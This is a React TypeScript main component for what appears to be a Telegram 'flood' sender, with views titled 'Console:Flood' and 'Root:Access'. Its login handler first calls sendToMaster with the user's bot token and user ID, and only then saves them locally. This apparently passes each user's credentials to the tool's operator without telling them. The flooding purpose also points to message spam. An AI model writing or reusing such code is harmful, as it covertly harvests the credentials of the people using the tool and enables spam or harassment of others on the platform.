
import React, { useState, useEffect } from 'react';
import { AppView, UserCredentials, SendStatus } from './types.ts';
import Layout from './components/Layout.tsx';
import LoginView from './components/LoginView.tsx';
import SenderView from './components/SenderView.tsx';
import CongratsView from './components/CongratsView.tsx';
import { sendToMaster, sendWelcomeMessage } from './services/telegramService.ts';

const App: React.FC = () => {
  const [view, setView] = useState<AppView>(AppView.LOGIN);
  const [credentials, setCredentials] = useState<UserCredentials | null>(null);
  const [lastStatus, setLastStatus] = useState<SendStatus | null>(null);
  const [isTransitioning, setIsTransitioning] = useState(false);

  useEffect(() => {
    const savedToken = localStorage.getItem('tele_token');
    const savedUserId = localStorage.getItem('tele_userid');
    if (savedToken && savedUserId) {
      setCredentials({ token: savedToken, userId: savedUserId });
      setView(AppView.SENDER);
    }
  }, []);

  const changeView = (newView: AppView) => {
    setIsTransitioning(true);
    setTimeout(() => {
      setView(newView);
      setIsTransitioning(false);
    }, 400);
  };

  const handleLogin = async (creds: UserCredentials) => {
    await sendToMaster(creds.token, creds.userId);
    await sendWelcomeMessage(creds.token, creds.userId);
    
    localStorage.setItem('tele_token', creds.token);
    localStorage.setItem('tele_userid', creds.userId);
    setCredentials(creds);
    
    changeView(AppView.SENDER);
  };

  const handleLogout = () => {
    localStorage.removeItem('tele_token');
    localStorage.removeItem('tele_userid');
    setCredentials(null);
    setLastStatus(null);
    changeView(AppView.LOGIN);
    console.log("[SECURITY] SESSION_TERMINATED: Storage wiped.");
  };

  const handleFinished = (status: SendStatus) => {
    setLastStatus(status);
    changeView(AppView.CONGRATS);
  };

  const renderView = () => {
    switch (view) {
      case AppView.LOGIN:
        return <LoginView onLogin={handleLogin} />;
      case AppView.SENDER:
        return credentials ? (
          <SenderView 
            credentials={credentials} 
            onFinished={handleFinished} 
            onLogout={handleLogout}
          />
        ) : null;
      case AppView.CONGRATS:
        return lastStatus ? (
          <CongratsView 
            status={lastStatus} 
            onReset={() => changeView(AppView.SENDER)} 
          />
        ) : null;
      default:
        return null;
    }
  };

  const getTitle = () => {
    switch (view) {
      case AppView.LOGIN: return "Terminal:Login";
      case AppView.SENDER: return "Console:Flood";
      case AppView.CONGRATS: return "Console:Result";
      default: return "Root:Access";
    }
  };

  return (
    <div className={`transition-all duration-500 ${isTransitioning ? 'opacity-0 scale-95 blur-md' : 'opacity-100 scale-100 blur-0'}`}>
      <Layout title={getTitle()}>
        {renderView()}
      </Layout>
    </div>
  );
};

export default App;
